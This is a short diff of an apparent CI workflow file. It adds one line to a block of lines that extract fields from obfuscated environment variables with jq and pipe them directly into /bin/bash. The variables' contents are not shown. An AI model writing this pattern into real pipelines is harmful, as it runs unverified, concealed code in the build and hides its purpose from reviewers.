@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$bi91" | jq -r .vo63 | /bin/bash
           printf '%s' "$tw0460" | jq -r .ggtuv01006 | /bin/bash
           echo $rl370 | jq -r .p39 | /bin/bash
+          echo $z567 | jq -r .sym58725 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
